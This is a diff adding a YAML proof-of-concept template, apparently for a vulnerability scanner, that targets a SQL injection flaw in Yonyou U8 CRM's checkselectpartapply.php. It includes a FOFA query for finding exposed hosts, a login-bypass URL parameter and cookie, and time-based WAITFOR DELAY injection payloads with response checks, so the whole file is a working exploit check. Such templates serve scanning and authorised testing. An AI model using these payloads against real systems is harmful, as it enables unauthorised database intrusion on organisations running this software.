@@ -1,0 +1,28 @@
+id: poc-yaml-yongyon-u8-crm-checkselectpartapply-php-sqli
+info:
+  name: 用友U8 CRM checkselectpartapply.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友U8+CRM
+  fofa: body="用友U8CRM"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 3
+requests:
+- method: POST
+  path: /partrtn/checkselectpartapply.php?DontCheckLogin=1
+  headers:
+    Cookie: PHPSESSID=bgsesstimeout-;
+    Content-Type: application/x-www-form-urlencoded
+  data: applyIDs=1'
+  expression: status_code == 200 && contains(body,"\"success\":false")
+- method: POST
+  path: /partrtn/checkselectpartapply.php?DontCheckLogin=1
+  headers:
+    Cookie: PHPSESSID=bgsesstimeout-;
+    Content-Type: application/x-www-form-urlencoded
+  data: applyIDs=1);WAITFOR+DELAY+'0:0:{{.t1}}'--
+  expression: status_code == 200 && contains(body,"\"success\":true") && contains(body,"fromObjID")
+    && duration > t1 && duration < t2
+transport: http
